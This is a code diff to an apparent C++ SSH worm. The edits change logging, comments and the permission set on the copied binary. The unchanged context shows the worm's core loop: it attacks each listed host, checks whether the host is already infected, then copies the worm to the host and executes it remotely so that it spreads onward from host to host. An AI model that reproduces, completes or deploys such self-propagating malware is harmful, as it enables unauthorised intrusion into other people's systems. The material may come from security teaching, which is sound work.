@@ -83,7 +83,7 @@ bool isRemoteFileExist(ssh_session &sshClient, const string inFile) {
     // Try to stat the file
     fileStat = sftp_stat(sftp, inFile.c_str());
     if (fileStat == NULL) {
-        fprintf(stderr, "isRemoteFileExist: Stat error <%s>\n", sftp_get_error(sftp));
+        // If fileStat is NULL it means the file doesn't exist
         sftp_free(sftp);
         return false;
     }
@@ -695,8 +695,8 @@ int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
         return -1;
     }
 
-    // We want to chmod +x on it
-    sprintf(command, "%s%s", "chmod +x ", destName);
+    // We want to allow read/execute to file for all chmod a+rx
+    sprintf(command, "%s%s", "chmod a+rx ", destName);
     if (remoteExecute(sshClient, command) != 0) {
         perror("spreadAndExecute: failed chmod the worm\n");
         return -1;
@@ -777,6 +777,8 @@ int main (int argc, const char **argv) {
         string host = allHosts[i];
         ssh_session sshClient;
 
+        printf ("\n");
+        // Attempt to attack the host
         sshClient = attackSystem(host);
 
         if (sshClient == NULL) {
@@ -789,7 +791,7 @@ int main (int argc, const char **argv) {
         // If we get here, it means that we have a good sshClient
 
         if (! isRemoteSystemInfected(sshClient)) {
-
+            printf("Host %s has not been infected yet, spread it...\n", host.c_str());
             // The remote system has not been infected yet.
             // We will spread it
             if (spreadAndExecute(sshClient, thisHost.ip) != 0) {
@@ -801,18 +803,18 @@ int main (int argc, const char **argv) {
             // Close the sshClient
             ssh_disconnect(sshClient);
             ssh_free(sshClient);
-
             // Since we want to spread from A to B.  Then B to C
             break;
 
         } else {
             // The remote system has been infected.  Skip to next one
-            printf("Remote host %s already infected.  Skip to the next one\n", host.c_str());
+            printf("Remote host %s already infected.  Skip\n", host.c_str());
             continue;
         }
 
     }  // End for loop of all Hosts
 
+    printf("All Done with attacking\n");
     // All Done here
     return 0;
 
